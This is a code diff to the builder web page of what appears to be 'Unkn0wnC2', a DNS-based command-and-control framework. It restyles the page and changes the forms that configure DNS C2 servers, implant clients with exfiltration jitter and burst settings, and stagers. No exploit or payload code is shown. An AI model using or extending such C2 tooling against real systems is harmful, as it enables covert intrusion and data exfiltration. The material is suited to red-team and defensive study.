@@ -4,7 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Builder - Unkn0wnC2</title>
-    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=ITC+Benguiat:wght@400;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -13,27 +15,30 @@
         }
 
         body {
-            font-family: 'Courier New', monospace;
-            background: #000;
-            color: #fff;
-            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f0f;
+            color: #e0e0e0;
         }
 
         .navbar {
-            background: rgba(20, 20, 20, 0.9);
+            background: rgba(20, 20, 20, 0.95);
+            border-bottom: 1px solid #333;
             padding: 15px 30px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #ff3333;
-            margin-bottom: 30px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
         .navbar-brand {
-            font-family: 'Bebas Neue', sans-serif;
             font-size: 32px;
+            font-weight: 700;
             color: #ff3333;
-            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+            font-family: 'Bebas Neue', 'Impact', sans-serif;
+            letter-spacing: 4px;
         }
 
         .navbar-menu {
@@ -48,7 +53,6 @@
             border-radius: 4px;
             transition: all 0.3s;
         }
-
         .nav-link:hover {
             color: #ff3333;
             background: rgba(255, 51, 51, 0.1);
@@ -96,20 +100,21 @@
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
+            padding: 40px 30px;
         }
 
         .builder-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            gap: 25px;
+            margin-bottom: 40px;
         }
 
         .builder-card {
-            background: rgba(20, 20, 20, 0.6);
-            border: 1px solid rgba(255, 51, 51, 0.3);
+            background: rgba(30, 30, 30, 0.8);
+            border: 1px solid rgba(255, 51, 51, 0.2);
             border-radius: 8px;
             padding: 20px;
             transition: all 0.3s;
@@ -247,11 +252,13 @@
         }
 
         .section-title {
-            font-family: 'Bebas Neue', sans-serif;
-            font-size: 28px;
+            font-family: 'Bebas Neue', 'Arial Narrow', sans-serif;
+            font-size: 36px;
+            font-weight: 700;
             color: #ff3333;
-            margin-bottom: 20px;
-            letter-spacing: 2px;
+            margin-bottom: 25px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(255, 51, 51, 0.3);
         }
 
         .help-text {
@@ -322,18 +329,13 @@
                 <div class="form-group">
                     <label class="form-label">Domain *</label>
                     <input type="text" id="dnsServerDomain" class="form-input" placeholder="example.com" required>
-                    <div class="help-text">Domain this server will be authoritative for</div>
+                    <div class="help-text">Domain this server will be authoritative for (NS records will be auto-generated as ns1/ns2.domain)</div>
                 </div>
 
-                <div class="form-row">
-                    <div class="form-group">
-                        <label class="form-label">NS1 *</label>
-                        <input type="text" id="dnsServerNS1" class="form-input" placeholder="ns1.example.com" required>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">NS2 *</label>
-                        <input type="text" id="dnsServerNS2" class="form-input" placeholder="ns2.example.com" required>
-                    </div>
+                <div class="form-group">
+                    <label class="form-label">Server Address *</label>
+                    <input type="text" id="dnsServerAddress" class="form-input" placeholder="98.90.218.70" required>
+                    <div class="help-text">Public IP address for A record responses (REQUIRED)</div>
                 </div>
 
                 <div class="form-group">
@@ -346,11 +348,6 @@
                     ▶ Advanced Options
                 </div>
                 <div id="dnsServerAdvanced" class="advanced-section">
-                    <div class="form-group">
-                        <label class="form-label">Server Address</label>
-                        <input type="text" id="dnsServerAddress" class="form-input" placeholder="98.90.218.70">
-                        <div class="help-text">Public IP for A record responses</div>
-                    </div>
                     <div class="form-group">
                         <label class="form-label">Encryption Key</label>
                         <input type="text" id="dnsServerEncKey" class="form-input" placeholder="Auto-generated">
@@ -369,11 +366,11 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">DNS Servers *</label>
-                    <select id="clientDNSServers" class="form-select" multiple size="4">
-                        <option value="" disabled>Loading DNS servers...</option>
-                    </select>
-                    <div class="help-text">Hold Ctrl/Cmd to select multiple</div>
+                    <label class="form-label">DNS Servers</label>
+                    <div id="clientDNSServersList" style="background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 4px; min-height: 80px; color: #aaa;">
+                        Loading DNS servers...
+                    </div>
+                    <div class="help-text">All registered DNS servers will be included automatically</div>
                 </div>
 
                 <div class="form-group">
@@ -549,27 +546,29 @@
                 const data = await response.json();
                 const servers = data.servers || [];
 
-                const clientSelect = document.getElementById('clientDNSServers');
+                // Store servers globally for buildClient
+                window.availableDNSServers = servers;
+
+                // Update client DNS servers display
+                const clientList = document.getElementById('clientDNSServersList');
                 const stagerSelect = document.getElementById('stagerDomain');
 
-                clientSelect.innerHTML = '';
+                if (servers.length === 0) {
+                    clientList.innerHTML = '<span style="color: #888;">No DNS servers registered yet. Build a DNS server first.</span>';
+                } else {
+                    clientList.innerHTML = servers.map(server => 
+                        `<div style="padding: 5px; color: #4CAF50;">✓ ${server.domain} (${server.id})</div>`
+                    ).join('');
+                }
+
+                // Update stager dropdown
                 stagerSelect.innerHTML = '<option value="">Select a DNS server</option>';
-
                 servers.forEach(server => {
-                    const clientOption = document.createElement('option');
-                    clientOption.value = server.domain;
-                    clientOption.textContent = `${server.domain} (${server.id})`;
-                    clientSelect.appendChild(clientOption);
-
                     const stagerOption = document.createElement('option');
                     stagerOption.value = server.domain;
                     stagerOption.textContent = `${server.domain} (${server.id})`;
                     stagerSelect.appendChild(stagerOption);
                 });
-
-                if (servers.length === 0) {
-                    clientSelect.innerHTML = '<option value="">No DNS servers registered yet</option>';
-                }
             } catch (error) {
                 console.error('Failed to load DNS servers:', error);
             }
@@ -577,14 +576,17 @@
 
         async function buildDNSServer() {
             const domain = document.getElementById('dnsServerDomain').value.trim();
-            const ns1 = document.getElementById('dnsServerNS1').value.trim();
-            const ns2 = document.getElementById('dnsServerNS2').value.trim();
             const upstream = document.getElementById('dnsServerUpstream').value.trim();
             const address = document.getElementById('dnsServerAddress').value.trim();
             const encKey = document.getElementById('dnsServerEncKey').value.trim();
 
-            if (!domain || !ns1 || !ns2) {
-                showAlert('Please fill in all required fields', 'error');
+            if (!domain) {
+                showAlert('Domain is required', 'error');
+                return;
+            }
+
+            if (!address) {
+                showAlert('Server address is required for A records', 'error');
                 return;
             }
 
@@ -595,10 +597,10 @@
                     method: 'POST',
                     body: JSON.stringify({
                         domain,
-                        ns1,
-                        ns2,
+                        ns1: '', // Will be auto-generated as ns1.domain
+                        ns2: '', // Will be auto-generated as ns2.domain
                         upstream_dns: upstream || '8.8.8.8:53',
-                        server_address: address || '',
+                        server_address: address,
                         encryption_key: encKey || ''
                     })
                 });
@@ -631,7 +633,14 @@
         }
 
         async function buildClient() {
-            const selectedServers = Array.from(document.getElementById('clientDNSServers').selectedOptions).map(opt => opt.value);
+            // Use all available DNS servers automatically
+            const allServers = window.availableDNSServers || [];
+            if (allServers.length === 0) {
+                showAlert('No DNS servers available. Build a DNS server first.', 'error');
+                return;
+            }
+
+            const selectedServers = allServers.map(s => s.domain);
             const platform = document.getElementById('clientPlatform').value;
             const sleepMin = parseInt(document.getElementById('clientSleepMin').value);
             const sleepMax = parseInt(document.getElementById('clientSleepMax').value);
@@ -639,11 +648,6 @@
             const exfilJitterMax = parseInt(document.getElementById('clientExfilJitterMax').value);
             const chunksPerBurst = parseInt(document.getElementById('clientChunksPerBurst').value);
             const burstPause = parseInt(document.getElementById('clientBurstPause').value);
-
-            if (selectedServers.length === 0) {
-                showAlert('Please select at least one DNS server', 'error');
-                return;
-            }
 
             showLoading('Building client... This may take a minute');
 
